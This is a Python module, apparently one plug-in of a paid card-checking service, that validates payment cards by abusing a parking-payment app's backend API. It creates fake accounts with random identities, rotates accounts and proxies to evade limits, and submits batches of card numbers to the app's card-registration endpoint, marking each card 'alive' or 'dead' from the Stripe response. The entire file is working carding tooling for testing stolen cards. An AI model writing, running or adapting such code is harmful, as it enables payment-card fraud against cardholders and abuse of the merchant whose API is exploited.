lines = [
"import os",
"import re",
"import random",
"import string",
"import threading",
"import requests",
"from urllib.parse import quote",
"from concurrent.futures import ThreadPoolExecutor",
"",
"NAME = 'Stripe Park'",
"COST = '3 credits / check'",
"",
"BASE = 'https://parkingpay-api-prod.azurewebsites.net'",
"",
"COMMON_HEADERS = {",
"    'user-agent': 'Dart/2.18 (dart:io)',",
"    'content-type': 'application/json; charset=utf-8',",
"}",
"",
"CARDS_PER_ACCOUNT = 20",
"TIMEOUT = 10",
"",
"_account = None",
"_cards_used = 0",
"_lock = threading.Lock()",
"",
"def _random_identity():",
"    first = ''.join(random.choices(string.ascii_lowercase, k=6)).title()",
"    last = ''.join(random.choices(string.ascii_lowercase, k=7)).title()",
"    return {",
"        'first_name': first,",
"        'last_name': last,",
"        'email': first.lower() + last.lower() + str(random.randint(100000, 999999)) + '@gmail.com',",
"        'phone': str(random.randint(1000000000, 9999999999)),",
"        'password': first.lower() + last.lower() + str(random.randint(1000, 9999)) + '.',",
"    }",
"",
"def _parse_cc(raw):",
"    parts = re.split(r'[|/\\s]+', raw.strip())",
"    parts = [p for p in parts if p]",
"    if len(parts) < 4:",
"        raise ValueError('Invalid card format')",
"    number = re.sub(r'\\D', '', parts[0])",
"    if not (13 <= len(number) <= 19):",
"        raise ValueError('Invalid PAN')",
"    mm = parts[1].zfill(2)",
"    yy = parts[2]",
"    if len(yy) == 2:",
"        yy = '20' + yy",
"    cvv = parts[3]",
"    return {'number': number, 'exp_month': mm, 'exp_year': yy, 'cvv': cvv}",
"",
"def _load_proxies():",
"    result = []",
"    for path in ['proxy.txt', 'proxies.txt']:",
"        if not os.path.exists(path):",
"            continue",
"        try:",
"            with open(path, 'r', encoding='utf-8') as f:",
"                for line in f:",
"                    line = line.strip()",
"                    if not line or line.startswith('#'):",
"                        continue",
"                    if '://' in line:",
"                        result.append({'http': line, 'https': line})",
"                    else:",
"                        parts = line.split(':')",
"                        if len(parts) == 4:",
"                            host, port, user, pwd = parts",
"                            u = 'http://' + quote(user, safe='') + ':' + quote(pwd, safe='') + '@' + host + ':' + port",
"                            result.append({'http': u, 'https': u})",
"                        elif len(parts) == 2:",
"                            host, port = parts",
"                            u = 'http://' + host + ':' + port",
"                            result.append({'http': u, 'https': u})",
"        except Exception:",
"            pass",
"    return result",
"",
"_PROXIES = _load_proxies()",
"if _PROXIES:",
"    print('[stripe_park] Loaded ' + str(len(_PROXIES)) + ' proxies')",
"",
"def _create_account(use_proxy=False):",
"    identity = _random_identity()",
"    session = requests.Session()",
"    session.headers.update(COMMON_HEADERS)",
"    if use_proxy and _PROXIES:",
"        session.proxies.update(_PROXIES[0])",
"    try:",
"        r = session.post(BASE + '/api/app/usuarios/registro', json={",
"            'correoElectronico': identity['email'],",
"            'nombre': identity['first_name'],",
"            'apellidos': identity['last_name'],",
"            'telefono': identity['phone'],",
"            'contrasena': identity['password'],",
"        }, timeout=TIMEOUT)",
"        if r.status_code == 403 or 'web app is stopped' in r.text.lower():",
"            raise ValueError('Gate is OFF')",
"        if r.status_code != 200:",
"            raise ValueError('Register failed: ' + str(r.status_code))",
"",
"        r = session.post(BASE + '/api/auth', json={",
"            'correoElectronico': identity['email'],",
"            'contrasena': identity['password'],",
"        }, timeout=TIMEOUT)",
"        if r.status_code == 403 or 'web app is stopped' in r.text.lower():",
"            raise ValueError('Gate is OFF')",
"        if r.status_code != 200:",
"            raise ValueError('Login failed: ' + str(r.status_code))",
"",
"        auth = r.json()",
"        token = auth.get('token')",
"        if not token:",
"            raise ValueError('No token returned')",
"        return {'token': token, 'email': identity['email']}",
"    except requests.exceptions.Timeout:",
"        raise ValueError('Request timeout')",
"    except requests.exceptions.ConnectionError:",
"        raise ValueError('Connection failed')",
"",
"def _check_card(token, card):",
"    session = requests.Session()",
"    session.headers.update(COMMON_HEADERS)",
"    session.headers['authorization'] = token",
"    try:",
"        r = session.post(BASE + '/api/app/conductor/tarjetas', json={",
"            'numero': card['number'],",
"            'expiracionMes': card['exp_month'],",
"            'expiracionYear': card['exp_year'],",
"        }, timeout=TIMEOUT)",
"    except requests.exceptions.Timeout:",
"        return {'status': 'error', 'message': 'Timeout'}",
"    except requests.exceptions.ConnectionError:",
"        return {'status': 'error', 'message': 'Connection failed'}",
"    except Exception as e:",
"        return {'status': 'error', 'message': str(e)[:80]}",
"    finally:",
"        session.close()",
"",
"    body = r.text",
"",
"    if r.status_code == 403 or 'web app is stopped' in body.lower():",
"        return {'status': 'error', 'message': 'Gate is OFF'}",
"    if r.status_code == 401 or 'no autorizado' in body.lower():",
"        return {'status': 'error', 'message': 'Token expired', 'need_new_account': True}",
"    if r.status_code in (429, 503):",
"        return {'status': 'error', 'message': 'Endpoint saturated'}",
"",
"    if 'fingerprint' in body:",
"        return {'status': 'success', 'message': 'Charge $1 MXN Approved'}",
"",
"    if 'error al crear la tarjeta en stripe' in body.lower():",
"        try:",
"            j = r.json()",
"            msg = j.get('message', '') or j.get('error', '') or 'Declined'",
"        except Exception:",
"            msg = 'Declined by Stripe'",
"        return {'status': 'declined', 'message': str(msg)[:120]}",
"",
"    try:",
"        j = r.json()",
"        if isinstance(j, dict):",
"            msg = j.get('message', '') or j.get('error', '') or str(j)[:120]",
"        else:",
"            msg = str(j)[:120]",
"    except Exception:",
"        msg = body[:120]",
"    return {'status': 'declined', 'message': msg}",
"",
"def _get_account(use_proxy=False):",
"    global _account, _cards_used",
"    with _lock:",
"        if _account is None or _cards_used >= CARDS_PER_ACCOUNT:",
"            _account = _create_account(use_proxy)",
"            _cards_used = 0",
"        return _account",
"",
"def _reset_account():",
"    global _account, _cards_used",
"    with _lock:",
"        _account = None",
"        _cards_used = 0",
"",
"def _format_result(url, result):",
"    status = result.get('status')",
"    if status == 'success':",
"        return {'url': url, 'status': 'alive', 'redirects_to': result.get('message', 'Approved'), 'response_time_ms': None, 'error': None}",
"    elif status == 'declined':",
"        return {'url': url, 'status': 'dead', 'redirects_to': None, 'response_time_ms': None, 'error': result.get('message', 'Declined')}",
"    else:",
"        return {'url': url, 'status': 'error', 'redirects_to': None, 'response_time_ms': None, 'error': result.get('message', 'Error')}",
"",
"def check(url):",
"    return check_batch([url])[0]",
"",
"def check_batch(urls):",
"    global _cards_used",
"    if not urls:",
"        return []",
"",
"    try:",
"        acc = _get_account(use_proxy=False)",
"    except Exception as e:",
"        print('[stripe_park] Account creation failed: ' + str(e)[:100])",
"        # Try with proxy if available",
"        if _PROXIES:",
"            try:",
"                acc = _get_account(use_proxy=True)",
"            except Exception as e2:",
"                return [{'url': u, 'status': 'error', 'redirects_to': None, 'response_time_ms': None, 'error': str(e2)[:150]} for u in urls]",
"        else:",
"            return [{'url': u, 'status': 'error', 'redirects_to': None, 'response_time_ms': None, 'error': str(e)[:150]} for u in urls]",
"",
"    token = acc['token']",
"    parsed = []",
"    for u in urls:",
"        try:",
"            parsed.append((u, _parse_cc(u)))",
"        except ValueError as e:",
"            parsed.append((u, None))",
"",
"    def process(item):",
"        u, card = item",
"        if card is None:",
"            return {'url': u, 'status': 'error', 'redirects_to': None, 'response_time_ms': None, 'error': 'Invalid card format'}",
"        result = _check_card(token, card)",
"        if result.get('need_new_account'):",
"            _reset_account()",
"        return _format_result(u, result)",
"",
"    results = []",
"    try:",
"        with ThreadPoolExecutor(max_workers=5) as executor:",
"            results = list(executor.map(process, parsed))",
"    except Exception as e:",
"        results = [{'url': u, 'status': 'error', 'redirects_to': None, 'response_time_ms': None, 'error': str(e)[:100]} for u in urls]",
"",
"    with _lock:",
"        _cards_used += len(urls)",
"",
"    return results",
"",
"def get_proxy_count():",
"    return len(_PROXIES)",
]

